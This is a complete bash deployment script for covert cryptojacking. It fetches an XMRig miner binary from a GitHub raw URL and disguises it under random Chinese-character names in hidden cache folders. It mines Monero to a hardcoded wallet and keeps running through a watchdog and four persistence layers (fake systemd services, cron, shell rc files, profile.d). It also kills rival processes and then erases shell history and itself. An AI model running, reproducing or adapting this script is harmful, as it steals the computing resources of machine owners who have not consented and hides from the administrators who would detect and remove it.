#!/usr/bin/env bash
#=============================================================================
# ANTI-KILL XMRig Deploy — graymeams/teams
#=============================================================================
# - Binary name: 6-10 karakter Mandarin random (susah diketik)
# - Workdir: ~/.cache/.cache_<random> (hidden)
# - Watchdog: restart <1 detik
# - Persistence: systemd + cron + bashrc + profile.d
# - Zero log, zero pid file
# - Password: sha256sum(hostname) | cut -c1-12
# - Wallet & pool hardcode
#=============================================================================

WALLET="43sxNTTWiKQj4LehDazVb8NQRKDztwiRcPFCivj3PbrqFPhujjxLd5TDCWfT6edSPXVRmUh3vhxysA35uHWnwY5UKGxvYFB"
POOL_URL="pool.supportxmr.com:443"
REPO_USER="grayteams"
REPO_NAME="teams"
BRANCH="main"
RAW_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"
MARKER_FILE="$HOME/.cache/.miner_instance"

# ===== UTILITY =====
randstr() {
    if [ -r /dev/urandom ]; then
        head -c "$1" /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' 2>/dev/null
    else
        openssl rand -hex 16 2>/dev/null | tr -dc 'a-z0-9' 2>/dev/null | head -c "$1"
    fi
}

download() {
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 30 --max-time 120 -o "$2" "$1"
    elif command -v wget >/dev/null 2>&1; then
        wget -q --timeout=30 -O "$2" "$1"
    else
        return 1
    fi
}

# ===== DEEP CLEAN — bersihin semua sisa instance lama =====
set +e

# Stop & hapus semua systemd service sisa
for f in "$HOME"/.config/systemd/user/svc-*.service; do
    [ -f "$f" ] || continue
    svcname="$(basename "$f" .service)"
    systemctl --user stop "$svcname" 2>/dev/null
    systemctl --user disable "$svcname" 2>/dev/null
    rm -f "$f" 2>/dev/null
done
for f in /etc/systemd/system/svc-*.service; do
    [ -f "$f" ] || continue
    svcname="$(basename "$f" .service)"
    systemctl stop "$svcname" 2>/dev/null
    systemctl disable "$svcname" 2>/dev/null
    rm -f "$f" 2>/dev/null
done
systemctl --user daemon-reload 2>/dev/null
systemctl daemon-reload 2>/dev/null

# Bersihin cron
rm -f /etc/cron.d/.sys_mk_* 2>/dev/null
if command -v crontab >/dev/null 2>&1; then
    crontab -l 2>/dev/null | grep -vE 'mk_[a-z0-9]{8}' | crontab - 2>/dev/null
fi

# Bersihin rc hooks
for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile"; do
    [ -f "$rc" ] || continue
    if grep -qE 'mk_[a-z0-9]{8}' "$rc" 2>/dev/null; then
        grep -vE 'mk_[a-z0-9]{8}' "$rc" > "${rc}.tmp" 2>/dev/null && mv "${rc}.tmp" "$rc" 2>/dev/null
    fi
done
rm -f /etc/profile.d/.sys_mk_*.sh 2>/dev/null

# Baca marker lalu hapus
if [ -f "$MARKER_FILE" ]; then
    OLD_WD="$(head -1 "$MARKER_FILE" 2>/dev/null)"
    if [ -n "$OLD_WD" ] && [ -d "$OLD_WD" ]; then
        pgrep -f "$OLD_WD" 2>/dev/null | xargs -r kill -9 2>/dev/null
    fi
    rm -f "$MARKER_FILE" 2>/dev/null
fi

# Kill semua process sisa — by karakter Mandarin
ps aux 2>/dev/null | grep -E '系统|核心|缓存|管理|数据库|维护|守护|进程|网络|存储|日志|监控|引擎|调度|备份|同步|服务|安全|认证|配置' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null

# Kill watchdog
pgrep -f 'wd_[a-z0-9]\{12\}' 2>/dev/null | xargs -r kill -9 2>/dev/null

# Kill process dari .cache_
ps aux 2>/dev/null | grep '/\.cache/.cache_' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null

sleep 0.5

# Double-tap
ps aux 2>/dev/null | grep -E '系统|核心|缓存|管理|数据库|维护|守护|进程|网络|存储|日志|监控|引擎|调度|备份|同步|服务|安全|认证|配置' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null
pgrep -f 'wd_[a-z0-9]\{12\}' 2>/dev/null | xargs -r kill -9 2>/dev/null
ps aux 2>/dev/null | grep '/\.cache/.cache_' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null

# Hapus semua workdir sisa
rm -rf "$HOME"/.cache/.cache_* 2>/dev/null

set -e

# ===== GENERATE RANDOM NAMES =====
MANDARIN=(
    "系统" "核心" "缓存" "管理" "数据库" "维护" "守护" "进程"
    "网络" "存储" "日志" "监控" "引擎" "调度" "备份" "同步"
    "服务" "安全" "认证" "配置"
)

BIN_NAME=""
N=$(( (RANDOM % 5) + 6 ))  # 6 to 10 parts
i=0
while [ $i -lt $N ]; do
    IDX=$(( RANDOM % 20 ))
    BIN_NAME="${BIN_NAME}${MANDARIN[$IDX]}"
    i=$(( i + 1 ))
done
BIN_NAME="${BIN_NAME}_d$(randstr 8)"

WORKDIR="$HOME/.cache/.cache_$(randstr 10)"
WDOG_NAME="wd_$(randstr 12)"
SVC_NAME="svc-$(randstr 10)"
CRON_MARKER="mk_$(randstr 8)"

# ===== DETECT ARCHITECTURE =====
ARCH="$(uname -m)"
case "$ARCH" in
    x86_64|amd64) BIN_SRC="systemx86" ;;
    aarch64|arm64) BIN_SRC="system64" ;;
    *) echo "[-] Arsitektur tidak didukung: $ARCH" >&2; exit 1 ;;
esac

# ===== GENERATE PASSWORD =====
if [ -n "${1:-}" ]; then
    PASS="$1"
elif command -v hostname >/dev/null 2>&1; then
    PASS="$(hostname | sha256sum | cut -c1-12)"
elif [ -f /etc/machine-id ] && [ -s /etc/machine-id ]; then
    PASS="$(sha256sum /etc/machine-id | cut -c1-12)"
elif [ -f /var/lib/dbus/machine-id ] && [ -s /var/lib/dbus/machine-id ]; then
    PASS="$(sha256sum /var/lib/dbus/machine-id | cut -c1-12)"
elif command -v hostnamectl >/dev/null 2>&1; then
    PASS="$(hostnamectl hostname 2>/dev/null | sha256sum | cut -c1-12)"
else
    PASS="$(date +%s | sha256sum | cut -c1-12)"
fi

# ===== CREATE WORKDIR =====
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Tulis marker
printf '%s\n%s\n%s\n' "$WORKDIR" "$SVC_NAME" "$CRON_MARKER" > "$MARKER_FILE"

# ===== DOWNLOAD & SETUP =====
download "${RAW_URL}/${BIN_SRC}" "${BIN_NAME}" || { echo "[-] Gagal download" >&2; exit 1; }
chmod +x "$BIN_NAME"

cat > config.json << XMREOF
{
    "autosave": true,
    "donate-level": 0,
    "donate-over-proxy": 0,
    "cpu": { "enabled": true, "huge-pages": true, "max-threads-hint": 75 },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "${POOL_URL}",
            "user": "${WALLET}",
            "pass": "${PASS}",
            "keepalive": true,
            "tls": true
        }
    ]
}
XMREOF
chmod 600 config.json

# Watchdog script
cat > "$WDOG_NAME" << 'WDOGEOF'
#!/usr/bin/env bash
DIR="WDOG_DIR_PLACEHOLDER"
BIN="WDOG_BIN_PLACEHOLDER"
cd "$DIR"
while true; do
    ./"$BIN" -c config.json >/dev/null 2>&1
    sleep 0.1
done
WDOGEOF
sed -i "s|WDOG_DIR_PLACEHOLDER|${WORKDIR}|" "$WDOG_NAME"
sed -i "s|WDOG_BIN_PLACEHOLDER|${BIN_NAME}|" "$WDOG_NAME"
chmod +x "$WDOG_NAME"

# ===== PERSISTENCE LAYER 1: SYSTEMD =====
SYSTEMD_OK=0
setup_systemd() {
    command -v systemctl >/dev/null 2>&1 || return 1

    if ! systemctl --user daemon-reload 2>/dev/null; then
        loginctl enable-linger 2>/dev/null || true
        if [ "$(id -u)" = "0" ]; then
            cat > "/etc/systemd/system/${SVC_NAME}.service" << EOF
[Unit]
Description=System Cache Management Service
After=network.target
[Service]
Type=simple
ExecStart=${WORKDIR}/${WDOG_NAME}
Restart=always
RestartSec=0
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target
EOF
            systemctl daemon-reload 2>/dev/null || true
            systemctl enable "$SVC_NAME" 2>/dev/null || true
            systemctl start "$SVC_NAME" 2>/dev/null || true
            return 0
        fi
        return 1
    fi

    mkdir -p "$HOME/.config/systemd/user"
    cat > "$HOME/.config/systemd/user/${SVC_NAME}.service" << EOF
[Unit]
Description=System Cache Management Service
After=default.target
[Service]
Type=simple
ExecStart=${WORKDIR}/${WDOG_NAME}
Restart=always
RestartSec=0
StandardOutput=null
StandardError=null
[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable "$SVC_NAME" 2>/dev/null || true
    systemctl --user start "$SVC_NAME" 2>/dev/null || true
    return 0
}

# ===== PERSISTENCE LAYER 2: CRON =====
CRON_OK=0
setup_cron() {
    local EVERY="* * * * * pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || (cd ${WORKDIR} && nohup ./${WDOG_NAME} >/dev/null 2>&1 &)"
    local REBOOT="@reboot (sleep \$((RANDOM % 30)) && cd ${WORKDIR} && nohup ./${WDOG_NAME} >/dev/null 2>&1 &)"

    if command -v crontab >/dev/null 2>&1; then
        local TMPC="$(mktemp 2>/dev/null || echo "/tmp/.ct_$(randstr 6)")"
        crontab -l 2>/dev/null | grep -v "$CRON_MARKER" > "$TMPC" 2>/dev/null || true
        printf '# %s\n%s\n%s\n' "$CRON_MARKER" "$EVERY" "$REBOOT" >> "$TMPC"
        crontab "$TMPC" 2>/dev/null && CRON_OK=1
        rm -f "$TMPC" 2>/dev/null
    fi

    if [ "$CRON_OK" = "0" ] && [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; then
        printf '# %s\n%s\n%s\n' "$CRON_MARKER" "$EVERY" "$REBOOT" > "/etc/cron.d/.sys_${CRON_MARKER}"
        chmod 644 "/etc/cron.d/.sys_${CRON_MARKER}" 2>/dev/null || true
        CRON_OK=1
    fi

    if [ "$CRON_OK" = "0" ] && [ -f /etc/crontab ] && [ -w /etc/crontab ]; then
        if ! grep -q "$CRON_MARKER" /etc/crontab 2>/dev/null; then
            printf '# %s\n%s\n%s\n' "$CRON_MARKER" "$EVERY" "$REBOOT" >> /etc/crontab
        fi
        CRON_OK=1
    fi
}

# ===== PERSISTENCE LAYER 3: SHELL RC =====
RC_OK=0
setup_shellrc() {
    local HOOK="pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || (cd ${WORKDIR} && nohup ./${WDOG_NAME} >/dev/null 2>&1 &) 2>/dev/null # ${CRON_MARKER}"

    for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile"; do
        if [ -f "$rc" ]; then
            if grep -q "$CRON_MARKER" "$rc" 2>/dev/null; then
                grep -v "$CRON_MARKER" "$rc" > "${rc}.tmp" 2>/dev/null && mv "${rc}.tmp" "$rc" 2>/dev/null
            fi
            echo "$HOOK" >> "$rc"
            RC_OK=1
        fi
    done

    if [ "$RC_OK" = "0" ]; then
        echo "$HOOK" >> "$HOME/.bashrc"
    fi
}

# ===== PERSISTENCE LAYER 4: PROFILE.D (root only) =====
setup_profile_d() {
    if [ -d /etc/profile.d ] && [ -w /etc/profile.d ]; then
        echo "pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || (cd ${WORKDIR} && nohup ./${WDOG_NAME} >/dev/null 2>&1 &) 2>/dev/null" > "/etc/profile.d/.sys_${CRON_MARKER}.sh"
        chmod 644 "/etc/profile.d/.sys_${CRON_MARKER}.sh" 2>/dev/null
    fi
}

# ===== EXECUTE =====
setup_systemd && SYSTEMD_OK=1 || true
setup_cron && CRON_OK=1 || true
setup_shellrc && RC_OK=1 || true
setup_profile_d 2>/dev/null || true

# Launch watchdog manual — HANYA kalau systemd DAN cron dua-duanya gagal
if [ "$SYSTEMD_OK" != "1" ] && [ "$CRON_OK" != "1" ]; then
    nohup ./"$WDOG_NAME" >/dev/null 2>&1 &
    disown 2>/dev/null || true
fi

# ===== CLEANUP JEJAK =====
history -c 2>/dev/null || true
if [ -f "$0" ] && [ "$(basename "$0")" != "bash" ]; then
    rm -f "$0" 2>/dev/null || true
fi

# ===== REPORT =====
echo "============================================"
echo "  DEPLOY COMPLETE"
echo "============================================"
echo "  Arch      : $ARCH ($BIN_SRC)"
echo "  Binary    : $BIN_NAME"
echo "  Workdir   : $WORKDIR"
echo "  Password  : $PASS"
echo "  systemd   : $([ "$SYSTEMD_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "  cron      : $([ "$CRON_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "  shellrc   : $([ "$RC_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "  Status    : Watchdog running"
echo "============================================"